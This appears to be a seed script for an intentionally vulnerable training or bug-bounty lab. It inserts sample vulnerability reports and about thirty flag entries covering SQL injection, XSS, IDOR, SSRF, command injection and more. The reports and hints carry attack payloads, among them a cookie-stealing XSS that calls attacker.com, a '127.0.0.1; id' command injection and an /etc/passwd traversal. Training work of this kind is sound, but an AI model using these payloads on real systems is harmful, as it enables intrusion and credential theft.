            triage_notes:'Confirmed critical. Parameterized queries required across all DB interactions.', triaged_by:1,
        },
        {
            user_id:3, title:'Stored XSS in blog comments via unescaped output',
            vuln_type:'xss_stored', severity:'high', cvss_score:8.2,
            affected_url:'POST /blog/:id/comment',
            steps:"1. Log in\n2. Navigate to any blog post\n3. Submit comment: <script>alert(document.cookie)</script>\n4. View the post — script executes for all visitors",
            impact:'Attacker can steal session cookies (httpOnly=false), redirect users, or deface pages. Admin cookie theft leads to full admin compromise.',
            proof_of_concept:'<img src=x onerror=fetch("http://attacker.com/?c="+document.cookie)>',
            suggested_fix:'Use <%=  %> instead of <%-  %> in EJS templates, or sanitize with DOMPurify server-side.',
            status:'accepted', bounty_amount:800, triaged_by:1,
        },
        {
            user_id:4, title:'IDOR on /orders/:id exposes other users PII and license keys',
            vuln_type:'idor', severity:'high', cvss_score:7.5,
            affected_url:'GET /orders/:id',
            steps:"1. Log in as any user\n2. Create or view an order to get your order ID\n3. Change ID in URL to another user's order ID\n4. Full order data, PII, and license keys are returned",
            impact:'Any authenticated user can access all orders. Exposes names, emails, phone numbers, shipping addresses, and software license keys.',
            proof_of_concept:'/orders/1  /orders/2  /orders/3 (change ID)',
            suggested_fix:'Add ownership check: WHERE o.id=$1 AND o.user_id=$2',
            status:'accepted', bounty_amount:600, triaged_by:1,
        },
        {
            user_id:5, title:'CORS misconfiguration allows credential theft from any origin',
            vuln_type:'cors', severity:'high', cvss_score:7.4,
            affected_url:'GET /api/v1/*',
            steps:"1. Set up page on attacker.com\n2. Issue: fetch('http://syntex.local/api/v1/users/me',{credentials:'include'})\n3. Response includes Access-Control-Allow-Origin: https://attacker.com\n4. Steal authenticated user data cross-origin",
            impact:'Malicious website can make authenticated API requests on behalf of any logged-in user, exfiltrating profile data, orders, and API keys.',
            proof_of_concept:"fetch('http://syntex.local/api/v1/users/me',{credentials:'include'}).then(r=>r.json()).then(d=>exfil(d))",
            suggested_fix:"Use strict origin allowlist instead of reflecting req.headers.origin",
            status:'accepted', bounty_amount:500, triaged_by:1,
        },
        {
            user_id:2, title:'Missing rate limiting on /login allows brute force',
            vuln_type:'rate_limit', severity:'medium', cvss_score:5.3,
            affected_url:'POST /login',
            steps:"1. Send repeated POST /login requests with X-Forwarded-For varied\n2. No lockout occurs\n3. Enumerate passwords freely",
            impact:'Allows brute force of any account. Combined with weak MD5 hashing, low-entropy passwords can be cracked in seconds.',
            proof_of_concept:'for i in $(seq 1 1000); do curl -X POST /login -H "X-Forwarded-For: 1.2.3.$i" ...; done',
            suggested_fix:'Implement server-side rate limiting using Redis, lock accounts after 5 failed attempts.',
            status:'accepted', bounty_amount:200, triaged_by:1,
        },
        {
            user_id:3, title:'DOM XSS via URL message parameter',
            vuln_type:'xss_dom', severity:'medium', cvss_score:6.1,
            affected_url:'GET /?message=',
            steps:"1. Navigate to /?message=<img src=x onerror=alert(1)>\n2. Script executes immediately",
            impact:'DOM-based XSS. Can be used in phishing links to execute scripts in the victim\'s session.',
            proof_of_concept:'/dashboard?message=<svg/onload=alert(document.cookie)>',
            suggested_fix:"Use textContent instead of innerHTML in app.js",
            status:'accepted', bounty_amount:300, triaged_by:1,
        },
        {
            user_id:4, title:'/.env file accessible without authentication',
            vuln_type:'exposure', severity:'critical', cvss_score:9.1,
            affected_url:'GET /.env',
            steps:"1. Navigate to /.env\n2. File is served publicly with all credentials",
            impact:'Exposes DB password, JWT secret, AWS credentials, Stripe secret key. Full platform compromise.',
            proof_of_concept:'curl http://syntex.local/.env',
            suggested_fix:'Never serve .env via static middleware. Use environment injection only.',
            status:'accepted', bounty_amount:2000, triaged_by:1,
        },
        {
            user_id:5, title:'Password reset tokens are predictable (MD5 of username+hour)',
            vuln_type:'auth', severity:'high', cvss_score:7.7,
            affected_url:'POST /forgot-password',
            steps:"1. Observe reset token format: reset_<username>_<md5>\n2. MD5 is derived from username + current hour timestamp\n3. Brute force or pre-compute token for any user\n4. Use token to reset any account's password",
            impact:'Account takeover for any user whose username is known, without requiring access to their email.',
            proof_of_concept:"token = 'reset_'+username+'_'+md5(username+'_'+Math.floor(Date.now()/3600000))",
            suggested_fix:'Use crypto.randomBytes(32).toString(hex) for reset tokens. Store hashed in DB.',
            status:'needs_more_info',
            triage_notes:'Please provide a working PoC demonstrating token prediction within the same hour window.', triaged_by:1,
        },
    ];

    for (const r of sampleReports) {
        await client.query(
            `INSERT INTO reports
             (user_id,title,vuln_type,severity,cvss_score,affected_url,steps,impact,
              proof_of_concept,suggested_fix,status,bounty_amount,triage_notes,triaged_by)
             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14)`,
            [r.user_id,r.title,r.vuln_type,r.severity,r.cvss_score||null,r.affected_url,
             r.steps||null,r.impact||null,r.proof_of_concept||null,r.suggested_fix||null,
             r.status,r.bounty_amount||0,r.triage_notes||null,r.triaged_by||null]
        );
    }

    console.log('[SEED v3.0] Hall of fame + sample reports inserted.');
}

// Re-export so seed.js main() can call it
if (require.main === module) {
    // standalone run — already handled by existing seed() call above
}

// ── v4.1 — 30 unique flags for all vulnerability categories ──────
async function seedAllFlags(client) {
    const flags = [
        // ── SQL Injection ─────────────────────────────────────────
        { slug:'sqli-login',            flag:'FLAG{SQLI_LOGIN_BYPASS_AUTH_COMPROMISED}',      title:'SQL Injection — Login Bypass',             category:'SQL Injection',     severity:'critical', points:250, difficulty:'easy',   endpoint:'POST /login',                         hint:'The login form passes username directly into SQL.' },
        { slug:'sqli-search',           flag:'FLAG{SQLI_SEARCH_UNION_DUMP_SUCCESS}',          title:'SQL Injection — Search UNION Dump',        category:'SQL Injection',     severity:'high',     points:200, difficulty:'medium', endpoint:'GET /search?q=',                      hint:'LIKE clause is injectable. Try UNION SELECT.' },
        { slug:'sqli-products',         flag:'FLAG{SQLI_ORDERBY_INJECTION_CONFIRMED}',        title:'SQL Injection — Products ORDER BY',         category:'SQL Injection',     severity:'medium',   points:150, difficulty:'medium', endpoint:'GET /products?sort=',                 hint:'ORDER BY clause cannot be parameterised.' },
        // ── XSS ───────────────────────────────────────────────────
        { slug:'xss-reflected',         flag:'FLAG{REFLECTED_XSS_SEARCH_COOKIE_STEAL}',      title:'Reflected XSS — Search Results',           category:'XSS',               severity:'medium',   points:150, difficulty:'easy',   endpoint:'GET /search?q=',                      hint:'Search query echoed without encoding (<%-  %>).' },
        { slug:'xss-stored-comments',   flag:'FLAG{STORED_XSS_BLOG_COMMENTS_EXECUTED}',      title:'Stored XSS — Blog Comments',               category:'XSS',               severity:'high',     points:200, difficulty:'easy',   endpoint:'POST /blog/:id/comment',              hint:'Comments rendered as raw HTML for every visitor.' },
        { slug:'xss-stored-reviews',    flag:'FLAG{STORED_XSS_PRODUCT_REVIEW_FIRED}',        title:'Stored XSS — Product Reviews',             category:'XSS',               severity:'high',     points:200, difficulty:'easy',   endpoint:'POST /products/:id/review',           hint:'Review content also uses unescaped EJS tag.' },
        { slug:'xss-dom',               flag:'FLAG{DOM_XSS_URL_PARAM_INNERHTML_EXEC}',       title:'DOM XSS — URL Parameters',                 category:'XSS',               severity:'medium',   points:150, difficulty:'easy',   endpoint:'GET /?message=',                      hint:'app.js writes ?message= to innerHTML without encoding.' },
        // ── IDOR ──────────────────────────────────────────────────
        { slug:'idor-profile-user2',    flag:'FLAG{IDOR_JOHN_DOE_PROFILE_SECRETNOTE}',       title:'IDOR — User #2 Profile Secret Note',       category:'IDOR',              severity:'high',     points:150, difficulty:'easy',   endpoint:'GET /profile/2',                      hint:'No ownership check on /profile/:id.' },
        { slug:'idor-profile-admin',    flag:'FLAG{IDOR_ADMIN_APIKEY_SECRETNOTE_LEAKED}',    title:'IDOR — Admin via API (no auth)',            category:'IDOR',              severity:'high',     points:200, difficulty:'easy',   endpoint:'GET /api/v1/users/1',                 hint:'GET /api/v1/users/:id requires no authentication.' },
        { slug:'idor-orders',           flag:'FLAG{IDOR_ORDER6_LICENSE_KEY_EXPOSED}',        title:'IDOR — Order #6 License Key',              category:'IDOR',              severity:'high',     points:150, difficulty:'easy',   endpoint:'GET /orders/6',                       hint:'Change the order ID in the URL.' },
        { slug:'idor-tickets',          flag:'FLAG{IDOR_TICKET3_INTERNAL_NOTES_READ}',       title:'IDOR — Ticket #3 Internal Staff Notes',    category:'IDOR',              severity:'medium',   points:150, difficulty:'easy',   endpoint:'GET /tickets/3',                      hint:'Internal notes visible to any authenticated user.' },
        { slug:'developer-secrets',     flag:'FLAG{IDOR_DEV_ACCOUNT_JWT_DB_CREDS}',         title:'IDOR — Developer Account Secrets',         category:'IDOR',              severity:'high',     points:200, difficulty:'medium', endpoint:'GET /profile/6',                      hint:'Developer secret_note contains JWT_SECRET and DB_PASS.' },
        // ── Auth Bypass ───────────────────────────────────────────
        { slug:'admin-panel-bypass',    flag:'FLAG{ADMIN_COOKIE_ROLE_BYPASS_PWNED}',         title:'Admin Panel Bypass via Cookie',             category:'Auth Bypass',       severity:'critical', points:250, difficulty:'easy',   endpoint:'GET /admin',                          hint:'requireAdmin reads role from cookie, not DB.' },
        { slug:'jwt-algnone',           flag:'FLAG{JWT_ALGNONE_NO_SIGNATURE_VERIFY}',        title:'JWT Algorithm Confusion — alg:none',        category:'JWT',               severity:'critical', points:300, difficulty:'medium', endpoint:'Authorization: Bearer <token>',        hint:'Pre-built debug token in /js/config.js.' },
        { slug:'jwt-weaksecret',        flag:'FLAG{JWT_SECRET123_CRACKED_HASHCAT}',          title:'JWT Weak Secret — Brute Forced',            category:'JWT',               severity:'high',     points:200, difficulty:'medium', endpoint:'POST /api/v1/token',                  hint:'JWT_SECRET is "secret123" — in rockyou.txt.' },
        // ── CSRF ──────────────────────────────────────────────────
        { slug:'csrf-profile',          flag:'FLAG{CSRF_PROFILE_UPDATE_NO_TOKEN}',           title:'CSRF — Profile Update No Token',            category:'CSRF',              severity:'medium',   points:150, difficulty:'medium', endpoint:'POST /profile/:id/edit',              hint:'No CSRF token on profile update form.' },
        { slug:'csrf-password',         flag:'FLAG{CSRF_PASSWORD_CHANGE_NO_OLDPW}',          title:'CSRF — Password Change (no old password)',  category:'CSRF',              severity:'high',     points:200, difficulty:'medium', endpoint:'POST /profile/:id/change-password',    hint:'Old password not required + no CSRF token.' },
        // ── SSRF ──────────────────────────────────────────────────
        { slug:'ssrf-internal',         flag:'FLAG{SSRF_INTERNAL_DEBUG_ENV_EXPOSED}',        title:'SSRF — Internal Network Access',            category:'SSRF',              severity:'critical', points:300, difficulty:'medium', endpoint:'POST /api/v1/fetch',                  hint:'Server fetches any URL. Try http://localhost:3000/debug' },
        { slug:'ssrf-webhook',          flag:'FLAG{SSRF_WEBHOOK_INTERNAL_PROBE_OK}',         title:'SSRF — Webhook Endpoint',                   category:'SSRF',              severity:'high',     points:200, difficulty:'medium', endpoint:'POST /api/v2/webhook',                hint:'callback_url is fetched server-side without validation.' },
        // ── File Upload / LFI ─────────────────────────────────────
        { slug:'file-upload-bypass',    flag:'FLAG{FILE_UPLOAD_DOUBLE_EXT_BYPASS}',          title:'File Upload — Extension Bypass',            category:'File Upload',       severity:'high',     points:200, difficulty:'medium', endpoint:'POST /upload',                        hint:'Only extname() checked. shell.php.jpg passes.' },
        { slug:'lfi-download',          flag:'FLAG{LFI_PATH_TRAVERSAL_ETCPASSWD}',           title:'Path Traversal — File Download',            category:'LFI',               severity:'high',     points:200, difficulty:'medium', endpoint:'GET /download?file=',                 hint:'No path validation. Try ../../etc/passwd' },
        // ── Command Injection ─────────────────────────────────────
        { slug:'cmd-injection-contact', flag:'FLAG{CMDINJ_CONTACT_FORM_OS_EXEC}',            title:'Command Injection — Contact Form',          category:'Command Injection', severity:'critical', points:300, difficulty:'medium', endpoint:'POST /contact',                       hint:'Name field used in exec() shell command.' },
        { slug:'cmd-injection-ping',    flag:'FLAG{CMDINJ_ADMIN_PING_UTILITY_RCE}',          title:'Command Injection — Admin Ping',            category:'Command Injection', severity:'critical', points:300, difficulty:'easy',   endpoint:'POST /admin/ping',                    hint:'host param: "127.0.0.1; id"' },
        // ── Open Redirect ─────────────────────────────────────────
        { slug:'open-redirect',         flag:'FLAG{OPENREDIRECT_LOGIN_PARAM_BYPASS}',        title:'Open Redirect — Login Redirect',            category:'Open Redirect',     severity:'medium',   points:100, difficulty:'easy',   endpoint:'GET /login?redirect=',                hint:'redirect param not validated. Try ?redirect=https://evil.com' },
        // ── Business Logic ────────────────────────────────────────
        { slug:'business-logic-negqty', flag:'FLAG{BIZLOGIC_NEGATIVE_QTY_FREE_ORDER}',       title:'Business Logic — Negative Quantity',        category:'Business Logic',    severity:'medium',   points:150, difficulty:'medium', endpoint:'POST /orders',                        hint:'quantity=-100 → total goes negative.' },
        { slug:'business-logic-coupon', flag:'FLAG{BIZLOGIC_COUPON_REUSE_NO_LIMIT}',         title:'Business Logic — Coupon Reuse',             category:'Business Logic',    severity:'medium',   points:150, difficulty:'medium', endpoint:'POST /orders/apply-coupon',            hint:'No per-user coupon use check.' },
        // ── Exposure ──────────────────────────────────────────────
        { slug:'exposed-env',           flag:'FLAG{DOTENV_CREDENTIALS_PUBLIC_SERVED}',       title:'Exposed .env File',                         category:'Exposure',          severity:'critical', points:100, difficulty:'easy',   endpoint:'GET /.env',                           hint:'Static file serving exposes .env' },
        { slug:'internal-config-api',   flag:'FLAG{APIV2_INTERNAL_CONFIG_NOAUTH}',           title:'Internal API Config — No Auth',             category:'Broken Access',     severity:'critical', points:200, difficulty:'easy',   endpoint:'GET /api/v2/internal/config',          hint:'No authentication required on /api/v2/internal/' },
        { slug:'mass-user-export',      flag:'FLAG{APIV2_USER_EXPORT_MD5_HASHES}',           title:'Unauthenticated User Export + Hashes',      category:'Broken Access',     severity:'high',     points:150, difficulty:'easy',   endpoint:'GET /api/v2/users/export',             hint:'Unauthenticated endpoint dumps all users with MD5 hashes.' },
        // ── GraphQL ───────────────────────────────────────────────
        { slug:'graphql-introspection', flag:'FLAG{GRAPHQL_INTROSPECTION_SCHEMA_OPEN}',      title:'GraphQL Introspection Enabled',             category:'GraphQL',           severity:'low',      points:100, difficulty:'easy',   endpoint:'POST /graphql',                       hint:'{ __schema { types { name } } }' },
        { slug:'graphql-idor',          flag:'FLAG{GRAPHQL_IDOR_SECRETNOTE_APIKEY}',         title:'GraphQL IDOR — Sensitive Field Access',     category:'GraphQL',           severity:'high',     points:200, difficulty:'medium', endpoint:'POST /graphql',                       hint:'{ user(id:1) { secret_note api_key password_hash } }' },
        // ── OAuth ─────────────────────────────────────────────────
        { slug:'oauth-missing-state',   flag:'FLAG{OAUTH_STATE_MISSING_CSRF_RISK}',          title:'OAuth — Missing State Parameter',           category:'OAuth/SSO',         severity:'medium',   points:150, difficulty:'medium', endpoint:'GET /oauth/authorize',                hint:'Authorize without state parameter — CSRF possible.' },
        // ── WebSocket ─────────────────────────────────────────────
        { slug:'ws-room-idor',          flag:'FLAG{WEBSOCKET_ROOM_IDOR_ANY_CHAT}',           title:'WebSocket — Room IDOR',                     category:'WebSocket',         severity:'medium',   points:150, difficulty:'medium', endpoint:'ws://localhost:3000/ws/chat?room=',    hint:'Change ?room= to access any support conversation.' },
        // ── Race Condition ────────────────────────────────────────
        { slug:'race-condition',        flag:'FLAG{RACE_CONDITION_REWARD_MULTICLAM}',        title:'Race Condition — Reward Claim',             category:'Race Condition',    severity:'medium',   points:200, difficulty:'hard',   endpoint:'POST /race/claim-reward',             hint:'Send 20 parallel requests — check-then-act flaw.' },
        // ── Rate Limit ────────────────────────────────────────────
        { slug:'rate-limit-bypass',     flag:'FLAG{RATELIMIT_XFORWARDEDFOR_BYPASS}',         title:'Rate Limit Bypass — X-Forwarded-For',       category:'Rate Limiting',     severity:'low',      points:100, difficulty:'easy',   endpoint:'POST /login',                         hint:'X-Forwarded-For header is trusted — rotate it.' },
        // ── Source Map ────────────────────────────────────────────
        { slug:'source-map-secrets',    flag:'FLAG{SOURCEMAP_JWT_SECRET_BUNDLE}',            title:'JS Source Map — Leaked Secrets',            category:'Exposure',          severity:'medium',   points:150, difficulty:'medium', endpoint:'GET /js/app.bundle.js.map',            hint:'Source map contains x-sourcemap-note with jwt_secret.' },
        // ── Swagger ───────────────────────────────────────────────
        { slug:'swagger-leak',          flag:'FLAG{SWAGGER_INTERNAL_ENDPOINTS_EXPOSED}',     title:'Swagger/OpenAPI — Internal Endpoints',      category:'Exposure',          severity:'medium',   points:100, difficulty:'easy',   endpoint:'GET /swagger.json',                   hint:'/swagger.json lists all internal endpoints and credentials.' },
    ];

    for (const f of flags) {
        await client.query(
            `INSERT INTO vuln_flags
                (slug, flag_value, vuln_title, category, severity, points, difficulty, endpoint, location_hint, is_active)
             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,true)
             ON CONFLICT (slug) DO UPDATE SET
                flag_value=$2, vuln_title=$3, category=$4, severity=$5,
                points=$6, difficulty=$7, endpoint=$8, location_hint=$9`,
            [f.slug, f.flag, f.title, f.category, f.severity,
             f.points, f.difficulty, f.endpoint, f.hint]
        );
    }

    // Initialise researcher_stats for all existing users
    await client.query(`
        INSERT INTO researcher_stats (user_id)
        SELECT id FROM users
        ON CONFLICT (user_id) DO NOTHING
    `);

    console.log(`[SEED v4.1] ${flags.length} flags seeded.`);
}

module.exports = { seedV3, seedAllFlags };
